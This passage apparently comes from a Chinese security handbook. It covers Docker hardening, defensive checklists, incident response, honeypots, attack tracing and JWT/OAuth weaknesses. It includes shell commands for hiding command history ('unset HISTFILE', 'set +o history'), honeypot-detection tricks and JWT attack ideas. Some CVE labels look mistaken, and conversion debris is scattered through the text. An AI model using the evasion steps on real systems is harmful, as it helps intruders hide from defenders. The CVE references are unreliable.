虽然 Docker 容器具有很强的安全保护措施，但是 Docker 守护进程本身并没有被完善的保护。Docker 守护进程本身默认由 root 用户运行，并 该进程本身并没有使用 Seccomp 或者 AppArmor 等安全模块进行保护。这使得一旦攻击者成功找到漏洞控制 Docker 守护进程进行任意文件写或者代码执行，就可以顺利获得宿主机的 root 权限而不会受到各种安全机制的阻碍。值得一提的是，默认情况下 Docker 不会开启 User Namespace 隔离，这也意味着 Docker 内部的 root 与宿主机 root 对文件的读写权限相同。这导致一旦容器内部 root 进程获取读写宿主机文件的机会，文件权限将不会成为另一个问题。这一点在 CVE-2019-5636 利用中有所体现。

#### 其他 CVE

-   CVE-2014-5277

-   CVE-2014-6408

-   CVE-2014-9357

-   CVE-2014-9358

-   CVE-2015-3627

-   CVE-2015-3630


### 7.2.5 安全加固

-   **最小安装**
    -   删除所有开发工具（编译器等）
    
-   更新系统源

-   启用 AppArmor

-   启用 SELinux

-   限制运行容器的内核功能

-   移除依赖构建

-   配置严格的网络访问控制策略

-   不使用 root 用户启动 docker

-   不以 privileged 特权模式运行容器

-   **控制资源**
    -   CPU Share
    
    -   CPU 核数
    
    -   内存资源
    
    -   IO 资源
    
    -   磁盘资源
    
    -   硬件资源
    
    -   单位时间内进程数量上限
    
-   使用安全的基础镜像

-   定期安全扫描和更新补丁

-   **删除镜像中的 setuid 和 setgid 权限**
    -   RUN find / -perm +6000-type f-exec chmod a-s {} \\;\|\| true
    
-   配置 Docker 守护程序的 TLS 身份验证

-   如非必要禁止容器间通信

-   **rootless Docker**
    -   <https://get.docker.com/rootless>
    
-   使用 Seccomp 限制 syscall

-   构建环境和在线环境分开

-   证书校验

### 7.2.6 Docker 环境识别

#### Docker 内

-   MAC 地址为 02:42:ac:11:00:00 - 02:42:ac:11:ff:ff

-   ps aux 大部分运行的程序 pid 都很小

-   cat /proc/1/cgroup docker 的进程

-   docker 环境下存在 .dockerenv

-   部分容器中缺少许多常用的命令如 ping 等

#### Docker 外

-   /var/run/docker.sock 文件存在

-   2375 / 2376 端口开启

### 7.2.7 参考链接

-   [A House of Cards An Exploration of Security When Building Docker Containers](https://blog.heroku.com/exploration-of-security-when-building-docker-containers)

-   [Privileged Docker Containers](http://obrown.io/2016/02/15/privileged-containers.html)

-   [32c3 docker writeup](https://kitctf.de/writeups/32c3ctf/docker)

-   [打造安全的容器云平台](https://blog.qiniu.com/archives/7743)

-   [Docker security](https://docs.docker.com/engine/security/security/)

-   [容器安全](http://blog.nsfocus.net/docker-mirror-security/)

-   [CVE-2017-7494 Docker 沙箱逃逸](https://strm.sh/post/abusing-insecure-docker-deployments/)

-   [Docker 容器安全性分析](https://www.freebuf.com/articles/system/221319.html)

-   [AppArmor security profiles for Docker](https://docs.docker.com/engine/security/apparmor/)

-   [Docker Bench for Security](https://github.com/docker/docker-bench-security)

-   [Docker 安全性与攻击面分析](https://mp.weixin.qq.com/s/d9D3z13uCOJoJzplpu3WJQ)

-   Pfleeger C P , Pfleeger S L , Theofanos M F . A methodology for penetration testing\[J\]. Computers & Security, 1989, 8(7):613-620.

&nbsp;

## 7.3 参考链接

### 7.3.1 文档

-   [Kubernetes Documentation](https://kubernetes.io/docs/home/)

-   [Openstack wiki](https://wiki.openstack.org/wiki/Main_Page)

-   [NSA, CISA release Kubernetes Hardening Guidance](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2716980/nsa-cisa-release-kubernetes-hardening-guidance/)

-   [Kubernetes Hardening Guidance](https://github.com/rootsongjc/kubernetes-hardening-guidance) Kubernetes 加固手册

### 7.3.2 元数据安全

-   [Exploiting SSRF in AWS Elastic Beanstalk](https://notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)

### 7.3.3 云存储

-   [ceph](https://github.com/ceph/ceph)

-   [ceph tracker](https://tracker.ceph.com/)



# 八.防御技术

## 8.1 团队建设

### 参考链接

-   [初入甲方的企业安全建设规划](https://mp.weixin.qq.com/s/BqOFP217kiN55IWb_oQP-w)

-   [企业安全项目架构实践分享](https://mp.weixin.qq.com/s/RlBTH9-xrY7Nd1ZJK3KjDQ)

-   [企业信息安全团队建设](https://xz.aliyun.com/t/1965)

## 8.2 红蓝对抗

### 参考链接

-   [以攻促防企业蓝军建设思考](https://mp.weixin.qq.com/s/8iJs2ON66NY1Jdbt7c-BTA)

-   [云上攻防：Red Teaming for Cloud](http://avfisher.win/archives/1175)

-   [网络攻防演练之企业蓝队建设指南](https://www.freebuf.com/articles/neopoints/252229.html)

&nbsp;

## 8.3 安全开发

### 参考链接

-   [SDL Practices](https://www.microsoft.com/en-us/securityengineering/sdl/practices)

-   [Threat Modeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)

&nbsp;

## 8.4 安全建设

### 参考链接

-   [我理解的安全运营 by 职业欠钱](https://zhuanlan.zhihu.com/p/39467201)

-   [再谈安全运营 by 职业欠钱](https://zhuanlan.zhihu.com/p/84591095)

-   [我们谈安全运营时在谈什么 by 聂君](https://mp.weixin.qq.com/s?__biz=MzIzMTAzNzUxMQ%3D%3D&mid=2652893616&idx=1&sn=6738a4e33050ed084d1535196aec6061)

-   [金融行业企业安全运营之路 by 聂君](https://36kr.com/p/1721236635649)

-   [秦波：大型互联网应用安全 SDL 体系建设实践](https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA%3D%3D&mid=2247485062&idx=1&sn=94c9fa40edef6de0ea46c453405e3687)

-   [谭晓生：论 CISO 的个人修养](https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA%3D%3D&mid=2247485405&idx=1&sn=bda9283329f6db15d69d4cdf37c609d2)

-   [赵彦的 CISO 闪电战两年甲方安全修炼之路](https://www.freebuf.com/articles/es/200024.html)

-   [胡珀谈安全运营 by lake2](https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA%3D%3D&mid=2247484735&idx=1&sn=02e06dd84ee0322dd2f9fe761b244013)

-   [小步快跑，快速迭代：安全运营的器术法道](https://mp.weixin.qq.com/s/rc6X5SlsoRp6s7RCEZ67mA)

-   [资产管理的难点](https://mp.weixin.qq.com/s?__biz=MzA5MDY3MzMyOQ%3D%3D&mid=2649439751&idx=1&sn=18ac49aff75ee4b1433e429df56ba44b)



## 威胁情报

### 参考链接

-   [Executive Perspectives on Cyber Threat Intelligence](https://scadahacker.com/library/Documents/Threat_Intelligence/iSight%20Partners%20-%20Executive%20Perspectives%20on%20Cyber%20Threat%20Intelligence.pdf)

-   [Cyber Threats: Information vs. Intelligence](https://www.darkreading.com/analytics/threat-intelligence/cyber-threats-information-vs-intelligence/a/d-id/1316851)

-   [威胁情报简介及市场浅析](https://www.freebuf.com/column/136763.html)

&nbsp;

## 8.6 ATT&CK

### 参考链接

-   [Mitre ATT&CK](https://attack.mitre.org/)

-   [Adversarial Threat Matrix](https://github.com/mitre/advmlthreatmatrix)

-   [MITRE ATT&CK：Design and Philosophy](https://www.mitre.org/sites/default/files/publications/pr-18-0944-11-mitre-attack-design-and-philosophy.pdf)

-   [ATT&CK 一般性学习笔记](https://bbs.pediy.com/thread-254825.htm)

-   [Cyber Threat Intelligence Repository expressed in STIX 2.0](https://github.com/mitre/cti)

-   [sigma](https://github.com/Neo23x0/sigma) Generic Signature Format for SIEM Systems

-   [caldera](https://github.com/mitre/caldera) Automated Adversary Emulation

-   [RTA](https://github.com/endgameinc/RTA) Red Team Automation

&nbsp;

## 8.7 风险控制

### 参考链接

-   [支付风控模型和流程分析](http://doc.cocolian.cn/essay/risk/2016/12/18/risk-2-database/)

-   [爱奇艺业务安全风控体系的建设实践](https://mp.weixin.qq.com/s?__biz=MzI0MjczMjM2NA%3D%3D&mid=2247483836&idx=1&sn=d46875c957289d8e035345992ad7053e)

&nbsp;

## 8.8 防御框架

## 8.9 加固检查

1.  ### 网络设备

    -   及时检查系统版本号

    -   敏感服务设置访问 IP/MAC 白名单

    -   开启权限分级控制

    -   关闭不必要的服务

    -   打开操作日志

    -   配置异常告警

    -   关闭 ICMP 回应

2.  ### 操作系统

#### Linux

-   无用用户/用户组检查

-   空口令帐号检查

-   #### 用户密码策略

    -   /etc/login.defs

    -   /etc/pam.d/system-auth

-   #### 敏感文件权限配置

    -   /etc/passwd

    -   /etc/shadow

> **--** \~/.ssh/

-   /var/log/messages

-   /var/log/secure

-   /var/log/maillog

-   /var/log/cron

-   /var/log/spooler

-   /var/log/boot.log

&nbsp;

-   日志是否打开

-   及时安装补丁

-   #### 开机自启

    -   /etc/init.d

-   检查系统时钟

#### Windows

-   异常进程监控

-   异常启动项监控

-   异常服务监控

-   配置系统日志

-   #### 用户账户

    -   设置口令有效期

    -   设置口令强度限制

    -   设置口令重试次数

-   安装 EMET

-   启用 PowerShell 日志

-   #### 限制以下敏感文件的下载和执行

    -   ade, adp, ani, bas, bat, chm, cmd, com, cpl, crt, hlp, ht, hta, inf, ins, isp, job, js, jse, lnk, mda, mdb, mde, mdz, msc, msi, msp, mst, pcd, pif, reg, scr, sct, shs, url, vb, vbe, vbs, wsc, wsf, wsh, exe, pif

-   #### 限制会调起 wscript 的后缀

    -   bat, js, jse, vbe, vbs, wsf, wsh

-   #### 域

    -   限制将计算机加入域的权限

    -   域账户使用最小权限原则

    -   减少非必要高权限账户的数量

### 应用

#### FTP

-   禁止匿名登录

-   修改 Banner

#### SSH

-   是否禁用 ROOT 登录

-   是否禁用密码连接

#### MySQL

-   文件写权限设置

-   用户授权表管理

-   日志是否启用

-   版本是否最新

### Web 中间件

#### Apache

-   版本号隐藏

-   版本是否最新

-   禁用部分 HTTP 动词

-   关闭 Trace

-   禁止 server-status

-   上传文件大小限制

-   目录权限设置

-   是否允许路由重写

-   是否允许列目录

-   日志配置

-   配置超时时间防 DoS

-   #### 非属主用户文件读写限制

    -   httpd.conf

    -   access.log

    -   error.log

#### Nginx

-   禁用部分 HTTP 动词

-   禁用目录遍历

-   检查重定向配置

-   配置超时时间防 DoS

#### IIS

-   版本是否最新

-   日志配置

-   用户口令配置

-   ASP.NET 功能配置

-   配置超时时间防 DoS

#### JBoss

-   jmx console 配置

-   web console 配置

#### Tomcat

-   禁用部分 HTTP 动词

-   禁止列目录

-   禁止 manager 功能

-   用户密码配置

-   用户权限配置

-   配置超时时间防 DoS

5.  ### 密码管理策略

    -   长度不少于 8 个字符

    -   不存在于已有字典之中

    -   不使用基于知识的认证方式

6.  ### 参考链接 {#参考链接-42}

    -   [awesome windows domain hardening](https://github.com/PaulSec/awesome-windows-domain-hardening)

    -   [customize attack surface reduction](https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction)

&nbsp;

3.  ## 入侵检测

    1.  ### IDS 与 IPS

> IDS 与 IPS 是常见的防护设备，IPS 相对 IDS 的不同点在于，IPS 通常具有阻断能力。

2.  ### 常见入侵点

    -   Web 入侵

    -   高危服务入侵

3.  ### 监控实现

#### 客户端监控

-   监控敏感配置文件

#### 8.10. 入侵检测 291

-   **常用命令 ELF 文件完整性监控**

    -   ps

    -   lsof

> **--** \...

-   rootkit 监控

-   #### 资源使用报警

    -   内存使用率

    -   CPU 使用率

    -   IO 使用率

    -   网络使用率

-   新出现进程监控

-   基于 inotify 的文件监控

#### 网络检测

> 基于网络层面的攻击向量做检测，如 Snort 等。

#### 日志分析

> 将主机系统安全日志/操作日志、网络设备流量日志、Web 应用访问日志、SQL 应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。

1.  ### 参考链接 {#参考链接-43}

    -   [企业安全建设之 HIDS](https://www.freebuf.com/articles/es/194510.html)

    -   [大型互联网企业入侵检测实战总结](https://xz.aliyun.com/t/1626/)

    -   [同程入侵检测系统](https://mp.weixin.qq.com/s/kzeAEvz-ejLD71fgb5t8tA)

    -   [Web 日志安全分析系统实践](https://xz.aliyun.com/t/2136)

    -   [Web 日志安全分析浅谈](https://xz.aliyun.com/t/1121)

    -   [网络层绕过 IDS/IPS 的一些探索](https://mp.weixin.qq.com/s/QJeW7K-KThYHggWtJ-Fh3w)

&nbsp;

1.  ## 零信任安全

    1.  ### 参考链接 {#参考链接-44}

        -   [美国国防部零信任的支柱](https://mp.weixin.qq.com/s/Fd0iKkGgE6Y1e81tP3MJFQ)

2.  ## 蜜罐技术

    1.  ### 简介

> 蜜罐是对攻击者的欺骗技术，用以监视、检测、分析和溯源攻击行为，其没有业务上的用途，所有流入/流出蜜罐的流量都预示着扫描或者攻击行为，因此可以比较好的聚焦于攻击流量。
>
> 蜜罐可以实现对攻击者的主动诱捕，能够详细地记录攻击者攻击过程中的许多痕迹，可以收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据。另外蜜罐也可以消耗攻击者的时间，基于 JSONP 等方式来获取攻击者的画像。
>
> 但是蜜罐存在安全隐患，如果没有做好隔离，可能成为新的攻击源。

### 分类

> 按用途分类，蜜罐可以分为研究型蜜罐和产品型蜜罐。研究型蜜罐一般是用于研究各类网络威胁，寻找应对的方式，不增加特定组织的安全性。产品型蜜罐主要是用于防护的商业产品。
>
> 按交互方式分类，蜜罐可以分为低交互蜜罐和高交互蜜罐。低交互蜜罐模拟网络服务响应和攻击者交互，容易部署和控制攻击，但是模拟能力会相对较弱，对攻击的捕获能力不强。高交互蜜罐不是简单模拟协议或服务，而是提供真实的系统，使得被发现的概率大幅度降低。但是高交互蜜罐部署不当时存在被攻击者利用的可能性。

### 隐藏技术

> 蜜罐主要涉及到的是伪装技术，主要涉及到进程隐藏、服务伪装等技术。
>
> 蜜罐之间的隐藏，要求蜜罐之间相互隐蔽。进程隐藏，蜜罐需要隐藏监控、信息收集等进程。伪服务和命令技术，需要对部分服务进行伪装，防止攻击者获取敏感信息或者入侵控制内核。数据文件伪装，需要生成合理的虚假数据的文件。

### 识别技术

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}攻击者也会尝试对蜜罐进行识别。比较容易的识别的是低交互的蜜罐，尝试一些比较复杂 少见的操作能比较容易的识别低交互的蜜罐。相对困难的是高交互蜜罐的识别，因为高交互蜜罐通常以真实系统为基础来构
>
> 建，和真实系统比较近似。对这种情况，通常会基于虚拟文件系统和注册表的信息、内存分配特征、硬件特征、特殊指令等来识别。

#### 协议实现识别

> 部分蜜罐在实现的过程中，协议的部分参数固定或随机的范围有限，可以通过特定参数的范围来识别蜜罐。部分蜜罐协议支持的版本范围为某一特定版本范围，可以通过对应的版本范围来推测是否为蜜罐。
>
> 部分蜜罐在交互过程中有探测客户端特征的交互，可以通过这些交互过程来识别蜜罐。部分蜜罐对不正确的请求也返回正常的相应，可以通过这种特征来判定蜜罐。

#### 环境特征

> 部分蜜罐的用户名、密码固定，或内存使用、进程占用等动态特征变化较为规律，可以通过这种方式来判断是否为蜜罐。

5.  ### 参考链接 {#参考链接-45}

    -   [honeypot wiki](https://en.wikipedia.org/wiki/Honeypot%5f%28computing%29)

    -   [Modern Honey Network](http://threatstream.github.io/mhn/)

    -   [默安科技：幻阵](https://www.moresec.cn/magic-shield.html)

    -   [蜜罐与内网安全从 0 到 1](https://xz.aliyun.com/t/998)

    -   [浅析开源蜜罐识别与全网测绘](https://mp.weixin.qq.com/s?__biz=Mzk0NzE4MDE2NA%3D%3D&mid=2247483908&idx=1&sn=e6a319e22c3cd54650bdbba511e58a43)

&nbsp;

3.  # RASP

    1.  ### 简介

> RASP（Runtime Application Self-Protection）由 Gartner 在 2014 年引入，是一种应用层的安全保护技术。

### 参考链接 {#参考链接-46}

#### 厂商

-   [OpenRASP](https://rasp.baidu.com/)

-   [Micro Focus](https://www.microfocus.com/en-us/products/application-defender/features)

-   [Prevoty](https://www.prevoty.com/)

-   [waratek](https://www.waratek.com/application-security-platform/)

-   [OWASP AppSensor](http://appsensor.org/)

-   [Shadowd](https://shadowd.zecure.org/overview/introduction/)

-   [immun](https://www.immun.io/features)

-   [Contrast Security](https://www.contrastsecurity.com/runtime-application-self-protection-rasp)

-   [Signal Sciences](https://www.signalsciences.com/rasp-runtime-application-self-protection/)

-   [BrixBits](http://www.brixbits.com/security-analyzer.html)

#### Blog

-   [Python RASP 工程化一次入侵的思考](https://mp.weixin.qq.com/s/icWaHsC6dzlclxfLhvQjYA)

-   [浅谈 RASP 技术攻防之基础篇](https://www.freebuf.com/articles/web/197823.html)

4.  ## 应急响应

    1.  ### 响应流程

#### 事件发生

> 运维监控人员、客服审核人员等发现问题，向上通报。

#### 事件确认

> 收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。

#### 事件响应

> 各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。

#### 事件关闭

> 处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。

2.  ### 事件分类

    -   病毒、木马、蠕虫事件

    -   Web 服务器入侵事件

    -   第三方服务入侵事件

    -   #### 系统入侵事件

        -   利用 Windows 漏洞攻击操作系统

    -   #### 网络攻击事件

        -   DDoS / ARP 欺骗 / DNS 劫持等

3.  ### 分析方向

#### 文件分析

-   **基于变化的分析**

    -   日期

    -   文件增改

    -   最近使用文件

-   #### 源码分析

    -   检查源码改动

    -   查杀 WebShell 等后门

-   系统日志分析

-   #### 应用日志分析

    -   分析 User-Agent，e.g. awvs / burpsuite / w3af / nessus / openvas

    -   对每种攻击进行关键字匹配，e.g. select/alert/eval

    -   异常请求，连续的 404 或者 500

-   md5sum 检查常用命令二进制文件的哈希，检查是否被植入 rootkit

#### 进程分析

-   **符合以下特征的进程**

    -   CPU 或内存资源占用长时间过高

    -   没有签名验证信息

    -   没有描述信息的进程

    -   进程的路径不合法

-   dump 系统内存进行分析

-   正在运行的进程

-   正在运行的服务

-   父进程和子进程

-   后台可执行文件的完整哈希

-   已安装的应用程序

-   运行着密钥或其他正在自动运行的持久化程序

-   计划任务

#### 身份信息分析

-   本地以及域账号用户

-   异常的身份验证

-   非标准格式的用户名

#### 日志分析

-   杀软检测记录

#### 网络分析

-   防火墙配置

-   DNS 配置

-   路由配置

-   监听端口和相关服务

-   最近建立的网络连接

-   RDP / VPN / SSH 等会话

#### 配置分析

-   查看 Linux SE 等配置

-   查看环境变量

-   查看配套的注册表信息检索，SAM 文件

-   内核模块

### Linux 应急响应

#### 文件分析

-   **最近使用文件**

    -   find / -ctime -2

    -   C:\\Documents and Settings\\Administrator\\Recent

    -   C:\\Documents and Settings\\Default User\\Recent

    -   %UserProfile%\\Recent

-   #### 系统日志分析

    -   /var/log/

-   #### 重点分析位置

    -   /var/log/wtmp 登录进入，退出，数据交换、关机和重启纪录

    -   /var/run/utmp 有关当前登录用户的信息记录

    -   /var/log/lastlog 文件记录用户最后登录的信息，可用 lastlog 命令来查看。

    -   /var/log/secure 记录登入系统存取数据的文件，例如 pop3/ssh/telnet/ftp 等都会被记录。

    -   /var/log/cron 与定时任务相关的日志信息

    -   /var/log/message 系统启动后的信息和错误日志

    -   /var/log/apache2/access.log apache access log

    -   /etc/passwd 用户列表

    -   /etc/init.d/ 开机启动项

    -   /etc/cron\* 定时任务

    -   /tmp 临时目录

    -   \~/.ssh

#### 用户分析

-   /etc/shadow 密码登陆相关信息

-   uptime 查看用户登陆时间

-   /etc/sudoers sudo 用户列表

#### 进程分析

-   netstat -ano 查看是否打开了可疑端口

-   w 命令，查看用户及其进程

-   #### ![](media/image6.png){width="0.13194444444444445in" height="0.13194444444444445in"}分析开机自启程序/脚

    -   /etc/init.d

    -   \~/.bashrc

-   #### 查看计划或定时任务

    -   crontab -l

-   netstat -an / lsof 查看进程端口占用

### Windows 应急响应

#### 文件分析

-   **最近使用文件**

    -   C:\\Documents and Settings\\Administrator\\Recent

    -   C:\\Documents and Settings\\Default User\\Recent

    -   %UserProfile%\\Recent

-   #### 系统日志分析

    -   事件查看器 eventvwr.msc

#### 用户分析

-   查看是否有新增用户

-   查看服务器是否有弱口令

-   查看管理员对应键值

-   lusrmgr.msc 查看账户变化

-   net user 列出当前登录账户

-   wmic UserAccount get 列出当前系统所有账户

#### 进程分析

-   netstat -ano 查看是否打开了可疑端口

-   tasklist 查看是否有可疑进程

-   #### 分析开机自启程序

    -   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

    -   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce

    -   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices

    -   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce

    -   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run

    -   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

    -   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

    -   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices

    -   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce

    -   (ProfilePath)\\Start Menu\\Programs\\Startup 启动项

    -   msconfig 启动选项卡

    -   gpedit.msc 组策略编辑器

-   #### 查看计划或定时任务

    -   C:\\Windows\\System32\\Tasks\\

    -   C:\\Windows\\SysWOW64\\Tasks\\

    -   C:\\Windows\\tasks\\

    -   schtasks

    -   taskschd.msc

    -   compmgmt.msc

-   #### 查看启动服务

    -   services.msc

#### 日志分析

-   **事件查看**

    -   eventvwr.msc

#### 其他

-   查看系统环境变量

6.  ### 参考链接 {#参考链接-47}

    -   [黑客入侵应急分析手工排查](https://xz.aliyun.com/t/1140)

    -   [取证入门 web 篇](http://www.freebuf.com/column/147929.html)

    -   [Windows 系统安全事件应急响应](https://xz.aliyun.com/t/2524)

    -   [企业安全应急响应](https://xz.aliyun.com/t/1632)

    -   [Technical Approaches to Uncovering and Remediating Malicious Activity](https://us-cert.cisa.gov/ncas/alerts/aa20-245a)

&nbsp;

5.  ## 溯源分析

    1.  ### 攻击机溯源技术

#### 基于日志的溯源

> 使用路由器、主机等设备记录网络传输的数据流中的关键信息 (时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。
>
> 这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。

#### 路由输入调试技术

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}在攻击持续发送数据， 特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在 DDoS 攻击追溯中比较有效， 网络开销较小。

#### 可控洪泛技术

> 追踪时向潜在的上游路由器进行洪泛攻击，如果发现收到的攻击流量变少则攻击流量会流经相应的路由。这种方式的优点在于不需要预先部署，对协同的需求比较少。但是这种方式本身是一种攻击，会对网络有所影响。

#### 基于包数据修改追溯技术

> 这种溯源方式直接对数据包进行修改，加入编码或者标记信息，在接收端对传输路径进行重构。这种方式人力投入较少，支持事后分析，但是对某些协议的支持性不太好。
>
> 基于这种方式衍生出了随机标记技术，各路由以一定概率对数据包进行标识，接收端收集到多个包后进行重构。

2.  ### 基于蜜罐溯源

    -   社交网络 jsonp API

    -   获取攻击者 IP

    -   获取 burp 信息

3.  ### 分析模型

#### 杀伤链 (Kill Kain) 模型

> 杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪 (Reconnais- sance)、武器构建 (Weaponization)、载荷投递 (Delivery)、漏洞利用 (Exploitation)、安装植入 (Installation)、通信控制 (Command&Control)、达成目标 (Actions on Objective) 等几个阶段。
>
> 在越早的杀伤链环节阻止攻击，防护效果就越好，因此杀伤链的概念也可以用来反制攻击。
>
> 在跟踪阶段，攻击者通常会采用扫描和搜索等方式来寻找可能的目标信息并评估攻击成本。在这个阶段可以通过日志分析、邮件分析等方式来发现，这阶段也可以采用威胁情报等方式来获取攻击信息。
>
> 武器构建阶段攻击者通常已经准备好了攻击工具，并进行尝试性的攻击，在这个阶段 IDS 中可能有攻击记录，外网应用、邮箱等帐号可能有密码爆破的记录。有一些攻击者会使用公开攻击工具，会带有一定的已知特征。
>
> 载荷投递阶段攻击者通常会采用网络漏洞、鱼叉、水坑、网络劫持、U 盘等方式投送恶意代码。此阶段已经有人员在对应的途径收到了攻击载荷，对人员进行充分的安全培训可以做到一定程度的防御。
>
> 突防利用阶段攻击者会执行恶意代码来获取系统控制权限，此时木马程序已经执行，此阶段可以依靠杀毒软件、异常行为告警等方式来找到相应的攻击。
>
> 安装植入阶段攻击者通常会在 web 服务器上安装 Webshell 或植入后门、rootkit 等来实现对服务器的持久化控制。可以通过对样本进行逆向工程来找到这些植入。
>
> 通信控制阶段攻击者已经实现了远程通信控制，木马会通过 Web 三方网站、DNS 隧道、邮件等方式和控制服务器进行通信。此时可以通过对日志进行分析来找到木马的痕迹。
>
> 达成目标阶段时，攻击者开始完成自己的目的，可能是破坏系统正常运行、窃取目标数据、敲诈勒索、横向移动等。此时受控机器中可能已经有攻击者的上传的攻击利用工具，此阶段可以使用蜜罐等方式来发现。

#### 钻石 (Diamond) 模型

> 钻石模型由网络情报分析与威胁研究中心 (The Center for Cyber Intelligence Anaysis and Threat Research， CCIATR) 机构的 Sergio Catagirone 等人在 2013 年提出。
>
> 该模型把所有的安全事件 (Event) 分为四个核心元素，即敌手 (Adversary)，能力 (Capability)，基础设施 (Infrastructure) 和受害者 (Victim)，以菱形连线代表它们之间的关系，因而命名为"钻石模型"。
>
> 杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。
>
> 在使用钻石模型分析时，通常使用支点分析的方式。支点 (Pivoting) 指提取一个元素，并利用该元素与数据源相结合以发现相关元素的分析技术。分析中可以随时变换支点，四个核心特征以及两个扩展特征 (社会政治、技术) 都可能成为当时的分析支点。

### 关联分析方法

> 关联分析用于把多个不同的攻击样本结合起来。

#### 文档类

-   hash

-   ssdeep

-   版本信息 (公司/作者/最后修改作者/创建时间/最后修改时间)

#### 行为分析

-   **基于网络行为**

    -   类似的交互方式

#### 可执行文件相似性分析

-   特殊端口

-   特殊字符串/密钥

-   #### PDB 文件路径

    -   相似的文件夹

-   #### 代码复用

    -   相似的代码片段

5.  ### 清除日志方式

    -   kill \<bash process ID\> 不会存储

    -   set +o history 不写入历史记录

    -   unset HISTFILE 清除历史记录的环境变量

6.  ### 参考链接 {#参考链接-48}

    -   [利用社交账号精准溯源的蜜罐技术](https://mp.weixin.qq.com/s/vlr2X68tMTgDhdDk4aow0g)

CHAPTER 9

认证机制

## 多因子认证

> 多因子认证是在单因子认证不足以保证安全性时使用的方法，通常会引入多种方式对用户身份进行验证。身份验证方法可以基于知识的认证，即密码；也可以基于物品的认证，例如硬件密钥；也可以是基于特征的认证，例如包含指纹在内的生物特征等。

2.  # SSO

    1.  ### 简介

> 单点登录 (SingleSignOn，SSO) 指一个用户可以通过单一的 ID 和凭证（密码）访问多个相关但彼此独立的系统。

#### 常见流程

1.  用户 (User) 向服务提供商 (Service Provider) 发起请求

2.  SP 重定向 User 至 SSO 身份校验服务 (Identity Provider)

3.  User 通过 IP 登录

4.  IP 返回凭证给 User

5.  User 将凭证发给 SP

#### 305

6.  SP 返回受保护的资源给用户其中凭证要有以下属性

-   签发者的签名

-   凭证的身份

-   #### 使用的时间

    -   过期时间

    -   生效时间

        1.  ### 可能的攻击/漏洞

#### 信息泄漏

> 若 SP 和 IP 之前使用明文传输信息，可能会被窃取。

#### 伪造

> 如果在通信过程中没有对关键信息进行签名，容易被伪造。

1.  # JWT

    1.  ### 简介

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（(RFC 7519). 该 token 被设计为紧凑 安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该 token 也可直接被用于认证，也可被加密。

### 构成

> 分为三个部分，分别为 header/payload/signature。其中 header 是声明的类型和加密使用的算法。payload是载荷，最后是加上 HMAC(base64(header)+base64(payload), secret)

### 安全问题

#### Header 部分

-   是否支持修改算法为 none/对称加密算法

-   删除签名

-   插入错误信息

-   kid 字段是否有 SQL 注入/命令注入/目录遍历

-   jwk 元素是否可信

-   是否强制使用白名单上的加密算法

#### Payload 部分

-   其中是否存在敏感信息

-   检查过期策略，比如 exp , iat

#### Signature 部分

-   检查是否强制检查签名

-   密钥是否可以爆破

-   是否可以通过其他方式拿到密钥

#### 其他

-   重放

-   通过匹配校验的时间做时间攻击

-   修改算法 RS256 为 HS256

-   弱密钥破解

    1.  ### 参考链接 {#参考链接-49}

&nbsp;

-   [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/)

    1.  ## OAuth

        1.  ### 简介

> OAuth 是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是 2.0 版。
>
> OAuth 在客户端与服务端之间，设置了一个授权层（authorization layer）。客户端不能直接登录服务端，只能登录授权层，以此将用户与客户端区分开来。客户端登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。
>
> 客户端登录授权层以后，服务端根据令牌的权限范围和有效期，向客户端开放用户储存的资料。
>
> OAuth 2.0 定义了四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）和客户端模式（client credentials）。

### 流程

